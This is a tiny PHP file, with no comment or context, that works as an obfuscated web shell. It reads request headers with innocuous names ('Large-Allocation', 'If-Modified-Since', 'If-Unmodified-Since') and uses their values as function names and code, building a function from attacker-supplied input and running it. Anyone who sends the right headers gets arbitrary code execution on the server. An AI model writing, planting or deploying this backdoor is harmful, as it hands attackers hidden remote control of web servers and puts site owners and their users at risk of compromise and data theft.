<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $multi = $_HEADERS['Large-Allocation']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['If-Modified-Since']));
    $multi();
}